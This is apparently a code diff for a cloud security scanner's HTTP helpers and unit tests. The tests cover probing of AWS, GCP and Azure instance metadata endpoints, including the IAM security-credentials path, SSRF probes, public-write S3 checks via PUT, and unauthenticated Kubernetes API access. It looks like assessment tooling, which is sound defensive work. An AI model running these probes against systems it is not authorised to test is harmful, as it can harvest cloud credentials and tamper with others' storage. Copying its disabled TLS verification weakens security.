+                    ),
+                ))
+
+    # ------------------------------------------------------------------
+    # HTTP helpers (minimal async implementation)
+    # ------------------------------------------------------------------
+
+    async def _http_get(
+        self,
+        url: str,
+        headers: dict | None = None,
+        timeout: int = 8,
+        verify_ssl: bool = True,
+    ) -> dict | None:
+        """Perform async HTTP GET. Returns dict with status/headers/body or None."""
+        try:
+            import aiohttp
+            import ssl
+            connector_kwargs: dict = {}
+            if not verify_ssl:
+                connector_kwargs["ssl"] = False
+            async with aiohttp.ClientSession() as session:
+                async with session.get(
+                    url,
+                    headers=headers or {},
+                    timeout=aiohttp.ClientTimeout(total=timeout),
+                    allow_redirects=True,
+                    **connector_kwargs,
+                ) as resp:
+                    body = await resp.text(errors="replace")
+                    return {
+                        "status": resp.status,
+                        "headers": dict(resp.headers),
+                        "body": body,
+                    }
+        except ImportError:
+            return await self._http_get_urllib(url, headers, timeout)
+        except Exception as exc:
+            log.debug("HTTP GET %s failed: %s", url, exc)
+            return None
+
+    async def _http_get_urllib(
+        self, url: str, headers: dict | None, timeout: int
+    ) -> dict | None:
+        """Fallback HTTP GET using urllib."""
+        try:
+            import urllib.request
+            import urllib.error
+            import ssl
+
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+
+            req = urllib.request.Request(url, headers=headers or {})
+            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+                body = resp.read(65536).decode("utf-8", errors="replace")
+                return {
+                    "status": resp.status,
+                    "headers": dict(resp.headers),
+                    "body": body,
+                }
+        except urllib.error.HTTPError as e:
+            return {"status": e.code, "headers": {}, "body": ""}
+        except Exception as exc:
+            log.debug("urllib GET %s failed: %s", url, exc)
+            return None
+
+    async def _http_head(
+        self,
+        url: str,
+        headers: dict | None = None,
+        timeout: int = 8,
+    ) -> dict | None:
+        """Perform async HTTP HEAD."""
+        try:
+            import aiohttp
+            async with aiohttp.ClientSession() as session:
+                async with session.head(
+                    url,
+                    headers=headers or {},
+                    timeout=aiohttp.ClientTimeout(total=timeout),
+                    allow_redirects=True,
+                    ssl=False,
+                ) as resp:
+                    return {
+                        "status": resp.status,
+                        "headers": dict(resp.headers),
+                    }
+        except Exception as exc:
+            log.debug("HTTP HEAD %s failed: %s", url, exc)
+            return None
+
+    async def _http_put(
+        self,
+        url: str,
+        headers: dict | None = None,
+        body: bytes = b"",
+        timeout: int = 8,
+    ) -> dict | None:
+        """Perform async HTTP PUT."""
+        try:
+            import aiohttp
+            async with aiohttp.ClientSession() as session:
+                async with session.put(
+                    url,
+                    headers=headers or {},
+                    data=body,
+                    timeout=aiohttp.ClientTimeout(total=timeout),
+                    ssl=False,
+                ) as resp:
+                    return {
+                        "status": resp.status,
+                        "headers": dict(resp.headers),
+                        "body": await resp.text(errors="replace"),
+                    }
+        except Exception as exc:
+            log.debug("HTTP PUT %s failed: %s", url, exc)
+            return None
 
 
-class TestCloudApiScanner:
-    """Unit tests for CloudApiScanner."""
+# ---------------------------------------------------------------------------
+# Tests
+# ---------------------------------------------------------------------------
 
-    def test_class_attributes(self) -> None:
-        assert CloudApiScanner.NAME == "cloud_api_scanner"
-        assert CloudApiScanner.PHASE == 2
-        assert "cloud" in CloudApiScanner.TAGS
+class TestCloudApiScanner(unittest.TestCase):
 
-    def test_instantiation(self, tmp_path: "Path") -> None:
-        from common.config import BaseForgeConfig
-        from common.scope import Scope
-        from common.db import create_db
+    def setUp(self):
+        self.scanner = CloudApiScanner(timeout=2)
 
-        cfg = BaseForgeConfig(target="http://169.254.169.254")
-        scope = Scope(["169.254.169.254"])
-        session = create_db(tmp_path / "test.db")
-        scanner = CloudApiScanner(cfg, scope, session, tmp_path)
-        assert scanner.NAME == "cloud_api_scanner"
-        assert hasattr(scanner, "run")
-        session.close()
+    # --- Unit: host normalization ---
+    def test_normalize_host_strips_https(self):
+        self.assertEqual(self.scanner._normalize_host("https://example.com/"), "example.com")
 
-    def test_classify_severity(self) -> None:
-        from common.config import BaseForgeConfig
-        from common.scope import Scope
-        from common.db import create_db
-        from pathlib import Path
-        import tempfile
+    def test_normalize_host_strips_http(self):
+        self.assertEqual(self.scanner._normalize_host("http://example.com"), "example.com")
 
-        with tempfile.TemporaryDirectory() as td:
-            tmp = Path(td)
-            cfg = BaseForgeConfig(target="http://169.254.169.254")
-            scope = Scope(["169.254.169.254"])
-            session = create_db(tmp / "test.db")
-            scanner = CloudApiScanner(cfg, scope, session, tmp)
-            assert scanner._classify_severity("/creds", "AccessKeyId=AKIAIOSFODNN7EXAMPLE") == Severity.CRITICAL
-            assert scanner._classify_severity("/latest/meta-data/iam/security-credentials/", "role-list") == Severity.HIGH
-            assert scanner._classify_severity("/latest/meta-data/hostname", "ip-10-0-0-1") == Severity.MEDIUM
-            session.close()
+    def test_normalize_host_plain(self):
+        self.assertEqual(self.scanner._normalize_host("example.com"), "example.com")
 
-    def test_header_string(self) -> None:
-        result = CloudApiScanner._header_string({"Metadata-Flavor": "Google"})
-        assert "Metadata-Flavor" in result
-        assert CloudApiScanner._header_string(None) == ""
+    # --- Unit: cloud provider detection ---
+    def test_detect_provider_aws(self):
+        self.assertEqual(self.scanner._detect_cloud_provider("s3.amazonaws.com"), "AWS")
+
+    def test_detect_provider_gcp(self):
+        self.assertEqual(self.scanner._detect_cloud_provider("storage.googleapis.com"), "GCP")
+
+    def test_detect_provider_azure(self):
+        self.assertEqual(self.scanner._detect_cloud_provider("account.blob.core.windows.net"), "AZURE")
+
+    def test_detect_provider_unknown(self):
+        self.assertEqual(self.scanner._detect_cloud_provider("example.com"), "UNKNOWN")
+
+    # --- Unit: S3 bucket detection ---
+    def test_s3_bucket_detection_explicit(self):
+        self.assertTrue(self.scanner._looks_like_s3_bucket("mybucket.s3.amazonaws.com"))
+
+    def test_s3_bucket_detection_heuristic(self):
+        self.assertTrue(self.scanner._looks_like_s3_bucket("my-cool-bucket"))
+
+    def test_s3_bucket_detection_negative(self):
+        self.assertFalse(self.scanner._looks_like_s3_bucket("a"))  # too short
+
+    # --- Unit: findings emission ---
+    def test_emit_findings_imds_aws(self):
+        imds = [{
+            "provider": "AWS",
+            "url": "http://169.254.169.254/latest/meta-data/",
+            "status": 200,
+            "body_excerpt": "ami-id",
+            "type": "imds_aws",
+            "severity": "CRITICAL",
+        }]
+        self.scanner._emit_findings("target", imds, [], imds)
+        self.assertEqual(len(self.scanner._findings), 1)
+        self.assertEqual(self.scanner._findings[0].severity, "CRITICAL")
+        self.assertEqual(self.scanner._findings[0].mitre_ttp, "T1552.005")
+
+    def test_emit_findings_s3_public_read(self):
+        s3 = [{
+            "provider": "AWS",
+            "service": "S3",
+            "url": "https://bucket.s3.amazonaws.com",
+            "status": 200,
+            "method": "GET",
+            "type": "s3_public_list",
+            "severity": "HIGH",
+            "body_excerpt": "<ListBucketResult>",
+        }]
+        scanner = CloudApiScanner()
+        scanner._emit_findings("target", [], s3, s3)
+        self.assertEqual(len(scanner._findings), 1)
+        self.assertEqual(scanner._findings[0].service, "S3")
+
+    def test_emit_findings_s3_public_write(self):
+        s3 = [{
+            "provider": "AWS",
+            "service": "S3",
+            "url": "https://bucket.s3.amazonaws.com/probe.txt",
+            "status": 200,
+            "method": "PUT",
+            "type": "s3_public_write",
+            "severity": "CRITICAL",
+        }]
+        scanner = CloudApiScanner()
+        scanner._emit_findings("target", [], s3, s3)
+        self.assertIn("Writable", scanner._findings[0].title)
+
+    def test_emit_findings_k8s_unauth(self):
+        k8s = [{
+            "provider": "K8S",
+            "service": "APIServer",
+            "url": "https://target:6443/api",
+            "status": 200,
+            "type": "k8s_api",
+            "severity": "CRITICAL",
+            "body_excerpt": '{"kind":"APIVersions"}',
+        }]
+        scanner = CloudApiScanner()
+        scanner._emit_findings("target", [], [], k8s)
+        self.assertEqual(scanner._findings[0].mitre_ttp, "T1613")
+
+    def test_aws_imds_paths_coverage(self):
+        """AWS IMDS should check credentials path."""
+        self.assertTrue(any("security-credentials" in p for p in AWS_IMDS_PATHS))
+
+    def test_ssrf_probe_list_nonempty(self):
+        self.assertGreater(len(SSRF_PROBES), 0)
+
+    def test_cvss_critical_imds(self):
+        """CRITICAL IMDS finding should have high-impact CVSS."""
+        imds = [{
+            "provider": "AWS",
+            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "status": 200,
+            "body_excerpt": "credentials",
+            "type": "imds_aws",
+            "severity": "CRITICAL",
+        }]
+        scanner = CloudApiScanner()
+        scanner._emit_findings("target", imds, [], imds)
+        self.assertIn("C:H/I:H/A:H", scanner._findings[0].cvss)
+
+    def test_scanner_instantiation(self):
+        s = CloudApiScanner(timeout=5, max_concurrency=10)
+        self.assertEqual(s.timeout, 5)
+        self.assertEqual(s.max_concurrency, 10)
+
+    def test_findings_list_initially_empty(self):
+        self.assertEqual(len(self.scanner._findings), 0)
+
+
+if __name__ == "__main__":
+    unittest.main()
